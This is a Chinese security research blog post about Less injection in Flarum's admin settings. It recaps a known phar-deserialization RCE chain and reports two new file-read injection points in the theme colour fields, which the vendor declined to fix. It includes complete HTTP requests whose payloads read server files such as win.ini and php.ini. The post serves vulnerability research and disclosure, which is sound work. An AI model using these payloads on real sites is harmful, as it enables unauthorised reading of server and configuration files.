#  从 Vite 漏洞联想到 Flarum Less RCE  
原创 sw0rd1ight
                        sw0rd1ight  剑指安全   2026-01-31 05:01  
  
上一篇[Vite相关的漏洞](https://mp.weixin.qq.com/s?__biz=Mzk5MDc5MDY2OA==&mid=2247483774&idx=1&sn=c8785c9db9470f541a84aab15e8394fd&scene=21#wechat_redirect)  
  
涉及到的一些文件读取姿势（如inline、import等语法）让我想起了p牛2022年写的这篇文章《  
从偶遇Flarum开始的RCE之旅》  
  
https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNlBvn1kxRqiaOaeoKv4xm0K0nqJw1YGOU3PDtcDf1QVZFnic4bXHvWVcQ/640?wx_fmt=png&from=appmsg "")  
  
这篇文章中详细记录了p牛从一个Flarum论坛后台开始，逐步分析并最终实现远程代码执行（RCE）的过程。整个过程结合了代码审计和巧妙的漏洞利用链构造。其中最终达到RCE的关键是利用了Less的data-uri  
和@import (inline)  
语法  
## 0x01 重点回顾  
  
less语言官方对data-uri  
和@import (inline)  
语法的说明如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNXQbxsyKfSzVia36icXVvocMfybHTvo0icQMp4QicyTH1tfibgRTtfHnibaaA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNDcicIGot879BiacfULqSo4BTs8skF5Nn3v4SEiavbOIx1Iko5HSLd2L1A/640?wx_fmt=png&from=appmsg "")  
  
从上述描述中看起来只是跟文件读取有关，但是描述读取的都是正常的静态资源文件。但是p牛深入分析了php的Less库源码发现其中存在一些疏漏最终可以达到**任意文件读取**  
和**可控文件写入**  
- **任意文件读取**  
：通过data-uri()   
语法，可以读取服务器上的任意文件  
  
- **可控文件写入**  
：通过@import (inline)   
语法配合**data:协议**  
，可以将任意内容写入到生成的CSS文件（forum.css）的开头  
  
最终将上述发现串联在一起之后得到一个后台RCE  
- **写入恶意Payload**  
：在后台自定义CSS中，使用 @import (inline) 'data:,...'  
 语法，将一个**恶意构造的tar格式的phar文件内容**  
写入到forum.css  
文件的开头  
- **触发反序列化**  
：再次修改自定义CSS，使用 data-uri('phar://./assets/forum.css')  
 去包含刚才写入的文件。当PHP解析phar://  
协议时，会**自动反序列化**  
phar文件中嵌入的元数据（metadata）  
- **执行任意命令**  
：利用Flarum已使用的monolog  
日志库中的一条已知反序列化利用链，在反序列化时成功执行了系统命令达到RCE  
## 0x02 官方补丁分析  
  
后续Flarum官方是通过正则限制后台自定义的less语句不能使用上述2语法进行修复  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNgXkDKhpey9kHreaLotDQsBRzGrjoQXG3sLhiclbVlU8p9CXE5ol6OOA/640?wx_fmt=png&from=appmsg "")  
## 0x03 新的发现  
  
2年之后，在官方修复了该漏洞之后我再次进行深入分析，发现还有2处由于less编译导致的任意文件读取/RCE  
  
主要是在站点的主题色设置的位置，第一主题色的设置和第二主题色的设置Fluam后端都会使用less进行编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNFIx6e6aEQAymp0QGWow14aulMy0RLG2zBxI9ebYMKf8OsVd03Cdibrg/640?wx_fmt=png&from=appmsg "")  
  
以下以实现文件读取进行验证  
  
（因为PHP 8.0以上就不再支持phar反序列化了，所以达到RCE有php版本的限制，时代的眼泪）  
### 主题色设置-任意文件读取   
  
这个例子使用data-uri实现文件读取，发送如下请求  
```
POST /flarumtest/public/api/settings HTTP/1.1
Host: localhost:82
Content-Length: 107
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
X-CSRF-Token: I8tUWRAOy5ix2aiCcszeu8wvhsIFWsDD0Wt9RWFL
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Origin: http://localhost:82
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:82/flarumtest/public/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: flarum_session=oEcOtlAFo9XqbPJ80U1KXWGAhgOWCnMEK55Kkdy6
Connection: close

{"theme_primary_color":"#1f6cd1;  .test {content: data-uri('C:/Windows/win.ini');}","theme_dark_mode":false}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNY3736DArp7gjshcjKdgycWiabh8q8xvHc8hIN7uJJwvScZ5XrpGj7kw/640?wx_fmt=png&from=appmsg "")  
  
保存成功后会返回204，后续我们回到首页刷新一下，再访问编译后的css文件（其中包含文件内容的css文件有2个，/public/assets/forum.css  
和/public/assets/forum-en.css  
，不过forum-en.css  
的内容更为干净，只包含我们自定义的样式），即可看到base64编码后的文件内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNPeEN5N1oCILMwPBHBehehvcInf378PbBq3icLsOrtQvkzI5ibtpx0AGw/640?wx_fmt=png&from=appmsg "")  
  
实际调试过程中，发现要使用data-uri  
成功读取到文件，要求文件小于**32k**  
（最开始我尝试读取的文件是php.ini,然后死活读不出来，仔细一看原来是对文件大小有限制）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQN2icafg80rCoL5V2Vamyrdrq22x6B5WSmAM0BxQp5MB3wea4VJoea25w/640?wx_fmt=png&from=appmsg "")  
  
### 第二主题色设置-任意文件读取  
  
这个和上面的基本一致，只不过是参数存在差异。下面使用p牛说的另外一个法子@import  
来进行演示读取文件，这个法子对读取的文件内容没有大小限制，并且文件内容为明文  
```
POST /flarumtest/public/api/settings HTTP/1.1
Host: localhost:82
Content-Length: 103
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
X-CSRF-Token: I8tUWRAOy5ix2aiCcszeu8wvhsIFWsDD0Wt9RWFL
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Origin: http://localhost:82
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:82/flarumtest/public/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: flarum_session=oEcOtlAFo9XqbPJ80U1KXWGAhgOWCnMEK55Kkdy6
Connection: close

{"theme_secondary_color":"#1f6cd1; @import (inline) \"C:/xampp/php/php.ini\";","theme_dark_mode":false}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNiaBHBOK8RG8RTqibZOfhiaW9iaia8U3WMMqWAPjb4qlibNADgqOzfLN4GHVA/640?wx_fmt=png&from=appmsg "")  
  
类似的访问/flarumtest/public/assets/forum-en.css  
即可看到文件内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNavUD8YeuHQvVHdZq9ca7Iw582IEyqOVdRnrE2JBEMvO9nss8PhEl9A/640?wx_fmt=png&from=appmsg "")  
## 0x04 小插曲  
  
后续这些新发现有上报给官方  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tGwricZrhUvic8N7yYiblruK0GWVJUcEYQNotTumuNUoHeoV0sa1f8Z7Zic3FnUWcmPGmhFt4ttxnEWlpd2xs4n2kQ/640?wx_fmt=png&from=appmsg "")  
  
不过遗憾的是官方认为需要管理员权限，而拥有了Flarum管理员权限基本就可以做任何事情，所以不认为是漏洞。这两个漏洞中涉及的接口功能是修改系统颜色，但它实际上可以读取系统中不同的文件，甚至引发 RCE，这个其实是开发者预期之外的危害，不过确实需要权限的比较高，所以不当作漏洞修复也是没有问题的。  
## 0x05 总结  
- 其实是因为以前分析过p牛发现过的less导致rce的漏洞，接触过一些相关概念，所以在vite的第一个洞通报的时候，我才能很快理解大概原理并定位到关键点  
  
- p牛这些业界大佬的文章确实需要潜下心来进行细致研读  
  
- 上篇文章的评论区好像质疑vite这些漏洞的意义不大，但是其实作为一名业余的安全研究者（因为现在更多时间花在了开发和AI上，所以在安全上略显业余）来说侧重的是深入分析并进一步有所发现的过程  
  
  
上述分析仅仅用于安全学习和研究  
  
